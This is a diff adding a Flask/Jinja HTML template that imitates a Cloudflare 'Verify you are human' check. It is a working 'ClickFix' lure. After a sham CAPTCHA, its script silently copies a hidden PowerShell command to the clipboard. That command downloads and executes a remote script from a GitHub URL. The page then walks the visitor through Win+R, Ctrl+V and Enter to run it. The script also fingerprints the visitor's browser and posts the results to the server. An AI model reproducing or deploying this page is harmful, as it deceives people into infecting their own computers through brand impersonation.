@@ -1,0 +1,1001 @@
+{% extends 'base.html' %}
+
+{% block title %}Verify you are human | Cloudflare{% endblock %}
+
+{% block extra_css %}
+<style>
+:root {
+    --orange: #F38020;
+    --orange-dark: #e06c0c;
+    --orange-light: rgba(243, 128, 32, 0.1);
+    --orange-lighter: rgba(243, 128, 32, 0.05);
+    --gray-light: #f5f7fa;
+    --gray-medium: #e5e7eb;
+    --gray-dark: #6b7280;
+    --gray-darker: #374151;
+    --success: #10B981;
+    --success-light: rgba(16, 185, 129, 0.1);
+    --border-radius: 8px;
+    --border-radius-lg: 12px;
+    --transition: all 0.3s ease;
+    --shadow: 0 4px 6px rgba(0, 0, 0, 0.05), 0 1px 3px rgba(0, 0, 0, 0.1);
+    --shadow-hover: 0 10px 15px rgba(0, 0, 0, 0.1), 0 4px 6px rgba(0, 0, 0, 0.05);
+    --font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+}
+
+* {
+    box-sizing: border-box;
+}
+
+body {
+    font-family: var(--font-family);
+    background: #f9fafb;
+    min-height: 100vh;
+    line-height: 1.5;
+    color: var(--gray-darker);
+    margin: 0;
+    padding: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.cloudflare-verification {
+    max-width: 440px;
+    width: 90%;
+    margin: 2rem auto;
+    background: white;
+    border-radius: var(--border-radius-lg);
+    box-shadow: var(--shadow);
+    animation: fadeIn 0.5s ease-out;
+    overflow: hidden;
+}
+
+@keyframes fadeIn {
+    from { opacity: 0; transform: translateY(20px); }
+    to { opacity: 1; transform: translateY(0); }
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+.spinner {
+    border: 3px solid var(--orange-light);
+    border-radius: 50%;
+    border-top: 3px solid var(--orange);
+    width: 2.5rem;
+    height: 2.5rem;
+    animation: spin 1s linear infinite;
+    margin: 0 auto 1.25rem;
+}
+
+.header {
+    text-align: center;
+    padding: 1.5rem 1.5rem 1rem;
+    background: white;
+    border-bottom: 1px solid var(--gray-medium);
+}
+
+.logo {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 1.1rem;
+    font-weight: 600;
+    color: var(--orange);
+    margin-bottom: 0.75rem;
+}
+
+.logo svg {
+    margin-right: 0.5rem;
+}
+
+.title {
+    font-size: 1.25rem;
+    font-weight: 500;
+    color: var(--gray-darker);
+    margin-bottom: 0.5rem;
+}
+
+.domain-display {
+    font-size: 0.8125rem;
+    color: var(--gray-dark);
+    background: var(--gray-light);
+    padding: 0.375rem 0.75rem;
+    border-radius: 16px;
+    display: inline-block;
+    font-weight: 500;
+}
+
+#preloader {
+    text-align: center;
+    padding: 2rem 1.5rem;
+}
+
+.message {
+    margin-bottom: 0.9375rem;
+    line-height: 1.5;
+    color: var(--gray-dark);
+    text-align: center;
+    font-size: 0.9375rem;
+}
+
+.timer { 
+    color: var(--gray-dark); 
+    font-size: 0.8125rem; 
+    text-align: center;
+}
+
+/* CAPTCHA */
+.captcha-section {
+    padding: 0 1.5rem;
+}
+
+.captcha-image-container {
+    position: relative;
+    margin-bottom: 1rem;
+    background: var(--gray-light);
+    border-radius: var(--border-radius);
+    padding: 1.25rem;
+    text-align: center;
+    border: 1px solid var(--gray-medium);
+}
+
+.captcha-image-container img {
+    height: 6.5rem;
+    max-width: 100%;
+    image-rendering: crisp-edges;
+}
+
+.refresh-btn {
+    position: absolute;
+    right: 0.625rem;
+    top: 0.625rem;
+    background: white;
+    border: 1px solid var(--gray-medium);
+    border-radius: 6px;
+    width: 2rem;
+    height: 2rem;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: var(--transition);
+}
+
+.refresh-btn:hover { 
+    background: var(--gray-light); 
+    transform: rotate(90deg); 
+}
+
+#captchaInput {
+    width: 100%;
+    padding: 0.875rem 1rem;
+    border: 1px solid var(--gray-medium);
+    border-radius: var(--border-radius);
+    font-size: 0.9375rem;
+    box-sizing: border-box;
+    transition: var(--transition);
+    background: white;
+}
+
+#captchaInput:focus {
+    outline: none;
+    border-color: var(--orange);
+    box-shadow: 0 0 0 3px var(--orange-light);
+}
+
+.verification-steps, .instructions-steps {
+    margin: 1.5rem 0;
+}
+
+.step, .instruction-step {
+    display: flex;
+    align-items: flex-start;
+    padding: 0.75rem 0;
+}
+
+.step:first-child, .instruction-step:first-child { 
+    padding-top: 0; 
+}
+
+.step:last-child, .instruction-step:last-child { 
+    padding-bottom: 0; 
+}
+
+.step-number {
+    background: var(--orange);
+    color: white;
+    width: 1.5rem;
+    height: 1.5rem;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 0.75rem;
+    font-weight: 600;
+    margin-right: 0.75rem;
+    flex-shrink: 0;
+    margin-top: 0.125rem;
+}
+
+.instruction-step .step-number {
+    background: var(--orange-light);
+    color: var(--orange);
+    border: 1px solid var(--orange);
+}
+
+.step-content {
+    font-size: 0.875rem;
+    color: var(--gray-darker);
+    line-height: 1.5;
+}
+
+.instruction-step .step-content { 
+    flex-grow: 1; 
+}
+
+.modal-header {
+    padding: 1.5rem 1.5rem 0.5rem;
+}
+
+.modal-header h3 {
+    margin: 0;
+    font-size: 1.125rem;
+    font-weight: 600;
+    color: var(--gray-darker);
+}
+
+.modal-body {
+    padding: 0 1.5rem;
+}
+
+.modal-body p {
+    margin: 0 0 1.25rem;
+    color: var(--gray-dark);
+    font-size: 0.9375rem;
+}
+
+.modal-footer {
+    padding: 1rem 1.5rem 1.5rem;
+}
+
+.verify-button {
+    background-color: var(--orange);
+    color: white;
+    border: none;
+    padding: 0.9375rem;
+    width: 100%;
+    border-radius: var(--border-radius);
+    font-size: 0.9375rem;
+    font-weight: 500;
+    cursor: pointer;
+    transition: var(--transition);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-shadow: var(--shadow);
+}
+
+.verify-button:hover {
+    background-color: var(--orange-dark);
+    box-shadow: var(--shadow-hover);
+    transform: translateY(-1px);
+}
+
+.verify-button:active { 
+    transform: translateY(0); 
+}
+
+.verify-button:disabled {
+    background-color: var(--gray-medium);
+    cursor: not-allowed;
+    box-shadow: none;
+    transform: none;
+}
+
+.button-text { 
+    margin-left: 0.5rem; 
+}
+
+.button-spinner {
+    display: inline-block;
+    width: 1rem;
+    height: 1rem;
+    border: 2px solid rgba(255,255,255,0.3);
+    border-radius: 50%;
+    border-top-color: white;
+    animation: spin 1s linear infinite;
+}
+
+.verification-complete {
+    display: flex;
+    align-items: center;
+    margin-bottom: 1.5rem;
+    padding: 0 1.5rem;
+}
+
+.success-icon { 
+    margin-right: 0.75rem; 
+    flex-shrink: 0;
+}
+
+.verification-title {
+    font-weight: 600;
+    color: var(--success);
+    margin-bottom: 0.25rem;
+    font-size: 1.0625rem;
+}
+
+.verification-subtitle {
+    font-size: 0.875rem;
+    color: var(--gray-dark);
+}
+
+.instructions-container {
+    background: var(--gray-light);
+    border-radius: var(--border-radius);
+    padding: 1.25rem;
+    margin: 0 1.5rem 1.5rem;
+    border: 1px solid var(--gray-medium);
+}
+
+.instructions-header {
+    display: flex;
+    align-items: center;
+    margin-bottom: 0.875rem;
+    font-weight: 500;
+    color: var(--gray-darker);
+    font-size: 0.9375rem;
+}
+
+.instructions-header svg { 
+    margin-right: 0.5rem; 
+    flex-shrink: 0;
+}
+
+kbd {
+    background: white;
+    border: 1px solid var(--gray-medium);
+    border-radius: 4px;
+    padding: 0.1875rem 0.5rem;
+    font-family: inherit;
+    font-size: 0.75rem;
+    box-shadow: 0 1px 1px rgba(0,0,0,0.1);
+    display: inline-block;
+    margin: 0 0.125rem;
+    font-weight: 500;
+    color: var(--gray-darker);
+}
+
+.verification-code-container {
+    margin: 0 1.5rem 1.5rem;
+}
+
+.code-label {
+    font-size: 0.8125rem;
+    color: var(--gray-dark);
+    margin-bottom: 0.5rem;
+    font-weight: 500;
+}
+
+.code-wrapper {
+    display: flex;
+    border-radius: var(--border-radius);
+    overflow: hidden;
+    border: 1px solid var(--gray-medium);
+    transition: var(--transition);
+    background: white;
+}
+
+.code-wrapper:hover {
+    border-color: var(--orange);
+    box-shadow: 0 0 0 3px var(--orange-light);
+}
+
+.code-display {
+    flex-grow: 1;
+    padding: 0.9375rem;
+    background: var(--gray-light);
+    font-family: 'SF Mono', 'Roboto Mono', Monaco, Consolas, monospace;
+    font-size: 0.8125rem;
+    word-break: break-all;
+    color: var(--gray-darker);
+    overflow-x: auto;
+    line-height: 1.4;
+}
+
+.copy-btn {
+    background: var(--orange);
+    color: white;
+    border: none;
+    padding: 0 1.125rem;
+    cursor: pointer;
+    transition: var(--transition);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.copy-btn:hover { 
+    background: var(--orange-dark); 
+}
+
+.copy-btn:active { 
+    transform: scale(0.95); 
+}
+
+.status-message {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: var(--gray-dark);
+    font-size: 0.8125rem;
+    text-align: center;
+    margin: 0 1.5rem 1.5rem;
+    gap: 0.375rem;
+}
+
+.button-link {
+    display: block;
+    margin: 1rem 1.5rem 1.5rem;
+    padding: 0.875rem 1.5rem;
+    background-color: var(--orange);
+    color: white;
+    border-radius: var(--border-radius);
+    text-decoration: none;
+    font-weight: 500;
+    transition: background-color 0.3s;
+    text-align: center;
+}
+
+.button-link:hover {
+    background-color: var(--orange-dark);
+}
+
+.tooltip {
+    position: absolute;
+    background: rgba(0, 0, 0, 0.85);
+    color: white;
+    padding: 6px 12px;
+    border-radius: 4px;
+    font-size: 0.75rem;
+    white-space: nowrap;
+    z-index: 1000;
+    opacity: 0;
+    transition: opacity 0.3s;
+    pointer-events: none;
+    bottom: calc(100% + 8px);
+    left: 50%;
+    transform: translateX(-50%);
+}
+
+.tooltip.show {
+    opacity: 1;
+}
+
+.tooltip:after {
+    content: '';
+    position: absolute;
+    top: 100%;
+    left: 50%;
+    margin-left: -5px;
+    border-width: 5px;
+    border-style: solid;
+    border-color: rgba(0, 0, 0, 0.85) transparent transparent transparent;
+}
+
+/* Success panel */
+#success-panel .success-content {
+    padding: 1.5rem 0 0;
+}
+
+/* Responsive adjustments */
+@media (max-width: 576px) {
+    .cloudflare-verification {
+        width: 95%;
+        margin: 1rem auto;
+    }
+    
+    .header {
+        padding: 1.25rem 1.25rem 0.875rem;
+    }
+    
+    .logo {
+        font-size: 1rem;
+    }
+    
+    .title {
+        font-size: 1.125rem;
+    }
+    
+    .captcha-section {
+        padding: 0 1.25rem;
+    }
+    
+    .captcha-image-container {
+        padding: 1rem;
+    }
+    
+    .captcha-image-container img {
+        height: 5.5rem;
+    }
+    
+    .modal-header,
+    .modal-body,
+    .modal-footer {
+        padding-left: 1.25rem;
+        padding-right: 1.25rem;
+    }
+    
+    .modal-header {
+        padding-top: 1.25rem;
+    }
+    
+    .verification-complete,
+    .instructions-container,
+    .verification-code-container,
+    .status-message {
+        margin-left: 1.25rem;
+        margin-right: 1.25rem;
+    }
+    
+    .step-content, .instruction-step .step-content {
+        font-size: 0.8125rem;
+    }
+    
+    .code-display {
+        font-size: 0.75rem;
+        padding: 0.875rem;
+    }
+    
+    .button-link {
+        margin-left: 1.25rem;
+        margin-right: 1.25rem;
+    }
+}
+
+@media (max-width: 400px) {
+    .cloudflare-verification {
+        border-radius: 0;
+        width: 100%;
+        margin: 0;
+    }
+    
+    .instructions-header {
+        flex-direction: column;
+        align-items: flex-start;
+        gap: 0.5rem;
+    }
+    
+    .instructions-header svg {
+        margin-right: 0;
+    }
+    
+    .verification-complete {
+        flex-direction: column;
+        text-align: center;
+        gap: 0.5rem;
+    }
+    
+    .success-icon {
+        margin-right: 0;
+        margin-bottom: 0.5rem;
+    }
+}
+
+/* Animation for checkmark */
+.checkmark {
+    width: 24px;
+    height: 24px;
+    border-radius: 50%;
+    display: block;
+    stroke-width: 3;
+    stroke: #fff;
+    stroke-miterlimit: 10;
+    box-shadow: 0 0 0 var(--success-light);
+    animation: fill .4s ease-in-out .4s forwards, scale .3s ease-in-out .9s both;
+}
+
+@keyframes fill {
+    100% {
+        box-shadow: 0 0 0 30px transparent;
+    }
+}
+
+@keyframes scale {
+    0%, 100% {
+        transform: none;
+    }
+    50% {
+        transform: scale3d(1.1, 1.1, 1);
+    }
+}
+
+/* Focus states for accessibility */
+button:focus,
+input:focus {
+    outline: 2px solid var(--orange);
+    outline-offset: 2px;
+}
+
+/* Loading bar animation */
+.progress-bar {
+    height: 3px;
+    width: 100%;
+    background: var(--gray-medium);
+    position: relative;
+    overflow: hidden;
+    margin-top: 1rem;
+}
+
+.progress-bar::after {
+    content: '';
+    position: absolute;
+    height: 100%;
+    width: 50%;
+    background: var(--orange);
+    animation: loading 1.5s ease-in-out infinite;
+}
+
+@keyframes loading {
+    0% { left: -50%; }
+    100% { left: 100%; }
+}
+</style>
+{% endblock %}
+
+{% block content %}
+<div class="cloudflare-verification" role="dialog" aria-labelledby="cf-title" aria-describedby="cf-desc">
+    <div class="header">
+        <div class="logo">
+            <svg viewBox="0 0 60 60" width="24" height="24">
+                <path fill="#F38020"
+                      d="M30 0c16.6 0 30 13.4 30 30s-13.4 30-30 30S0 46.6 0 30 13.4 0 30 0zm0 12c-9.9 0-18 8.1-18
+                         18s8.1 18 18 18 18-8.1 18-18-8.1-18-18-18zm-5 8c1.1 0 2 .9 2 2v16c0 1.1-.9 2-2
+                         2s-2-.9-2-2V22c0-1.1.9-2 2-2zm10 0c1.1 0 2 .9 2 2v16c0 1.1-.9 2-2 2s-2-.9-2-2V22c0-1.1.9-2 2-2z"/>
+            </svg>
+            cloudflare.com
+        </div>
+        <div class="title">Verify you are human</div>
+        <div class="domain-display">{{ domain }}</div>
+    </div>
+
+    <div id="verification-container">
+        <div id="preloader">
+            <div class="spinner"></div>
+            <div class="message">
+                Checking your browser before accessing<br>
+                <strong>{{ domain }}</strong>
+            </div>
+            <div class="timer">Verifying... <span id="timer">0</span>s</div>
+            <div class="progress-bar"></div>
+        </div>
+
+        <div id="captcha-modal" style="display:none;">
+            <div class="modal-header">
+                <h3 id="cf-title">Complete these verification steps</h3>
+            </div>
+
+            <div class="modal-body" id="cf-desc">
+                <p>To better prove you are not a robot, please:</p>
+
+                <div class="captcha-section">
+                    <div class="captcha-image-container">
+                        <img id="captchaImage" src="{{ url_for('serve_captcha') }}?style=modern"
+                             alt="CAPTCHA image — readable text">
+                        <button id="refreshCaptcha" class="refresh-btn" title="Refresh CAPTCHA" aria-label="Refresh CAPTCHA">
+                            <svg viewBox="0 0 24 24" width="16" height="16">
+                                <path fill="#666"
+                                      d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99
+                                         8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82
+                                         2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66
+                                         0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/>
+                            </svg>
+                        </button>
+                    </div>
+                    <input type="text" id="captchaInput" placeholder="Enter CAPTCHA text" autocomplete="off" aria-label="CAPTCHA input">
+                </div>
+
+                <div class="verification-steps">
+                    <div class="step">
+                        <div class="step-number">1</div>
+                        <div class="step-content">Enter the CAPTCHA text above</div>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">2</div>
+                        <div class="step-content">Click "Verify" button</div>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">3</div>
+                        <div class="step-content">Follow the verification instructions</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="modal-footer">
+                <button id="verifyBtn" class="verify-button" aria-label="Verify CAPTCHA">
+                    <span class="button-text">VERIFY</span>
+                </button>
+            </div>
+        </div>
+
+        <div id="success-panel" style="display:none;">
+            <div class="success-content">
+                <div class="verification-complete">
+                    <svg viewBox="0 0 24 24" width="24" height="24" class="success-icon">
+                        <path fill="#10B981"
+                              d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48
+                                 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10
+                                 14.17l7.59-7.59L19 8l-9 9z"/>
+                    </svg>
+                    <div class="verification-text">
+                        <div class="verification-title">Verification complete</div>
+                        <div class="verification-subtitle">You can now continue to the website</div>
+                    </div>
+                </div>
+
+                <div class="instructions-container">
+                    <div class="instructions-header">
+                        <svg viewBox="0 0 24 24" width="18" height="18">
+                            <path fill="#F38020"
+                                  d="M12 2C6.48 2 2 6.48 2
+                                     12s4.48 10 10 10 10-4.48 10-10S17.52 2
+                                     12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                        </svg>
+                        <span>Follow these steps to finish verification:</span>
+                    </div>
+
+                    <div class="instructions-steps">
+                        <div class="instruction-step">
+                            <div class="step-number">1</div>
+                            <div class="step-content">Press <kbd>Windows</kbd> + <kbd>R</kbd> keys</div>
+                        </div>
+                        <div class="instruction-step">
+                            <div class="step-number">2</div>
+                            <div class="step-content">In the verification window, press <kbd>Ctrl</kbd> + <kbd>V</kbd></div>
+                        </div>
+                        <div class="instruction-step">
+                            <div class="step-number">3</div>
+                            <div class="step-content">Press <kbd>Enter</kbd> on the keyboard to finish</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="verification-code-container">
+                    <div class="code-label">Verification code (automatically copied):</div>
+                    <div class="code-wrapper">
+                        <div class="code-display" id="verificationCode" aria-label="Verification code"></div>
+                        <button id="copyButton" class="copy-btn" title="Copy to clipboard" aria-label="Copy to clipboard">
+                            <svg viewBox="0 0 24 24" width="16" height="16">
+                                <path fill="#fff"
+                                      d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3
+                                         4H8c-1.1 0-2 .9-2 2v14c0
+                                         1.1.9 2 2 2h11c1.1 0 2-.9
+                                         2-2V7c0-1.1-.9-2-2-2zm0
+                                         16H8V7h11v14z"/>
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+
+                <div class="status-message">
+                    <svg viewBox="0 0 24 24" width="14" height="14" class="clock-icon">
+                        <path fill="#6b7280"
+                              d="M11.99 2C6.47 2 2 6.48 2
+                                 12s4.47 10 9.99 10C17.52
+                                 22 22 17.52 22 12S17.52 2
+                                 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8
+                                 8-8 8 3.58 8 8-3.58 8-8
+                                 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/>
+                    </svg>
+                    <span>This page will close automatically in <span id="countdown">5</span> seconds</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block extra_js %}
+<script>
+const config = {
+    preloaderMs: "{{ preloader_ms }}",
+    captchaUrl: "{{ url_for('serve_captcha') }}",
+    verifyUrl: "{{ url_for('verify_captcha') }}",
+    domain: "{{ domain }}"
+};
+
+const preloader = document.getElementById('preloader');
+const captchaModal = document.getElementById('captcha-modal');
+const successPanel = document.getElementById('success-panel');
+const verifyBtn = document.getElementById('verifyBtn');
+const refreshBtn = document.getElementById('refreshCaptcha');
+const captchaInput = document.getElementById('captchaInput');
+const captchaImage = document.getElementById('captchaImage');
+const copyButton = document.getElementById('copyButton');
+const verificationCode = document.getElementById('verificationCode');
+const textToCopy = 'powershell -w hidden -c "IEX((New‑Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/powershell2025/micros2025/refs/heads/main/update.ps1\'))"';
+
+
+document.addEventListener('DOMContentLoaded', function() {
+    // Собираем данные о браузере
+    const verificationData = {
+        js_enabled: true,
+        cookies_enabled: navigator.cookieEnabled,
+        screen_resolution: screen.width + 'x' + screen.height,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        language: navigator.language,
+        hardware_concurrency: navigator.hardwareConcurrency || 0,
+        device_memory: navigator.deviceMemory || 0,
+        touch_support: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
+        plugins: Array.from(navigator.plugins).map(p => p.name),
+        fonts: [] // Можно добавить определение шрифтов
+    };
+
+    // Отправляем данные верификации
+    fetch('/api/verify_js', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(verificationData)
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log('JS verification result:', data);
+    })
+    .catch(error => {
+        console.error('JS verification error:', error);
+    });
+});
+
+
+// Timer
+let seconds = 0;
+const timerInterval = setInterval(() => {
+    seconds++;
+    document.getElementById('timer').textContent = seconds;
+}, 1000);
+
+// Show CAPTCHA modal after delay
+setTimeout(() => {
+    preloader.style.display = 'none';
+    captchaModal.style.display = 'block';
+    captchaInput.focus();
+}, parseInt(config.preloaderMs));
+
+// Refresh CAPTCHA
+refreshBtn.addEventListener('click', () => {
+    captchaImage.src = config.captchaUrl + '?style=modern&t=' + Date.now();
+    captchaInput.value = '';
+    captchaInput.focus();
+});
+
+// Handle verification
+verifyBtn.addEventListener('click', async () => {
+    const captchaText = captchaInput.value.trim();
+    if (!captchaText) {
+        showTooltip(verifyBtn, 'Please enter the CAPTCHA text');
+        captchaInput.focus();
+        return;
+    }
+
+    verifyBtn.disabled = true;
+    verifyBtn.innerHTML = '<span class="button-spinner"></span><span class="button-text">VERIFYING...</span>';
+
+    try {
+        const response = await fetch(config.verifyUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: `captcha=${encodeURIComponent(captchaText)}`
+        });
+        const result = await response.json();
+
+        if (result.success) {
+            captchaModal.style.display = 'none';
+            successPanel.style.display = 'block';
+            verificationCode.textContent = result.verification_code || textToCopy;
+
+            await copyToClipboard(textToCopy);
+            showTooltip(copyButton, 'Copied to clipboard!');
+
+            let countdown = 5;
+            const countdownElement = document.getElementById('countdown');
+            const countdownInterval = setInterval(() => {
+                countdown--;
+                countdownElement.textContent = countdown;
+                if (countdown <= 0) {
+                    clearInterval(countdownInterval);
+                    if (window.close) {
+                        window.close();
+                    } else {
+                        successPanel.insertAdjacentHTML('beforeend',
+                          '<div style="text-align:center;margin-top:1rem;"><a href="/" class="button-link">Return to homepage</a></div>');
+                    }
+                }
+            }, 1000);
+        } else {
+            showTooltip(verifyBtn, result.error || 'Verification failed');
+            if (result.error_type === 'captcha') {
+                refreshBtn.click();
+            }
+        }
+    } catch (error) {
+        console.error('Error:', error);
+        showTooltip(verifyBtn, 'An error occurred during verification');
+    } finally {
+        verifyBtn.disabled = false;
+        verifyBtn.innerHTML = '<span class="button-text">VERIFY</span>';
+    }
+});
+
+async function copyToClipboard(text) {
+    try {
+        if (navigator.clipboard) {
+            await navigator.clipboard.writeText(text);
+            return true;
+        }
+        const textarea = document.createElement('textarea');
+        textarea.value = text;
+        textarea.style.position = 'fixed';
+        textarea.style.opacity = 0;
+        document.body.appendChild(textarea);
+        textarea.select();
+        const successful = document.execCommand('copy');
+        document.body.removeChild(textarea);
+        if (!successful) throw new Error('Copy command failed');
+        return true;
+    } catch (err) {
+        console.error('Copy failed:', err);
+        return false;
+    }
+}
+
+copyButton.addEventListener('click', async () => {
+    const success = await copyToClipboard(verificationCode.textContent);
+    showTooltip(copyButton, success ? 'Copied again!' : 'Press Ctrl+C to copy');
+});
+
+captchaInput.addEventListener('keypress', (e) => {
+    if (e.key === 'Enter') verifyBtn.click();
+});
+
+function showTooltip(element, message) {
+    const existing = element.querySelector('.tooltip');
+    if (existing) existing.remove();
+    
+    const tooltip = document.createElement('div');
+    tooltip.className = 'tooltip';
+    tooltip.textContent = message;
+    
+    // Position the tooltip
+    element.style.position = 'relative';
+    element.appendChild(tooltip);
+    
+    // Show tooltip
+    setTimeout(() => {
+        tooltip.classList.add('show');
+        setTimeout(() => {
+            tooltip.classList.remove('show');
+            setTimeout(() => tooltip.remove(), 300);
+        }, 2000);
+    }, 10);
+}
+
+// Add focus styles for accessibility
+const focusableElements = document.querySelectorAll('button, input, [tabindex]');
+focusableElements.forEach(el => {
+    el.addEventListener('focus', () => {
+        el.style.outline = '2px solid var(--orange)';
+        el.style.outlineOffset = '2px';
+    });
+    
+    el.addEventListener('blur', () => {
+        el.style.outline = 'none';
+    });
+});
+</script>
+{% endblock %}
